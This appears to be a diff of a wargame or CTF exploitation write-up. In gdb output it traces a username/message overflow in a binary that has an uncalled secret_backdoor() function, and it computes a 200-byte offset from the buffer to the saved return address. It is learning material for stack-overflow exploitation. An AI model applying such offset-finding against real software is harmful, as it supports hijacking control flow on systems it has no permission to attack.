@@ -85,16 +85,7 @@ secret_backdoor() isnt called anywhere, which has system()
 ```
 
 ```
-SECURITY CONSIDERATIONS
-     The strcpy() function is easily misused in a manner which enables malicious users to arbitrarily
-     change a running program's functionality through a buffer overflow attack.
-``` 
-
-```
 => 0x555555554910 <handle_msg+80>:	callq  0x5555555549cd <set_username>
-
-(gdb) info frame
-rip at 0x7fffffffe598
 
 >: Enter your username
 >>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -114,16 +105,37 @@ so copy 41 bytes from the user input to some_struct->username
 >>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA        
 >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>:           ==> len = 41
 > msg:
-
-(gdb) x/s $rbp-0x400
-0x7fffffffe0c0:	 'B' <repeats 60 times>, "\n"
-
-(gdb) p/d 0x7fffffffe598 - 0x7fffffffe0c0
-$8 = 1240
-
-0x7fffffffe0c0:	0x42424242	0x42424242	0x42424242	0x42424242
-0x7fffffffe0d0:	0x42424242	0x42424242	0x42424242	0x42424242
-0x7fffffffe0e0:	0x42424242	0x42424242	0x42424242	0x42424242
-0x7fffffffe0f0:	0x42424242	0x42424242	0x42424242	0x0000000a
 ```
+************************-------------------********
+```
+(gdb) info breakpoints
+1       breakpoint     keep y   0x00000000000008c0 <handle_msg>
+2       breakpoint     keep y   0x0000000000000aa8 <main>
+
+(gdb) define hook-stop
+>x/15i $rip
+>end
+(gdb)
+
+our Buffer starts here
+
+=> 0x555555554915 <handle_msg+85>:	lea    -0xc0(%rbp),%rax
+   0x55555555491c <handle_msg+92>:	mov    %rax,%rdi
+   0x55555555491f <handle_msg+95>:	callq  0x555555554932 <set_msg>
+   
+(gdb) x/x $rbp-0xc0
+0x7fffffffe4d0
+
+(gdb) info frame
+rip at 0x7fffffffe598
+
+p/d 0x7fffffffe598 - 0x7fffffffe4d0 = 200
+```
+
+
+
+
+
+
+
 
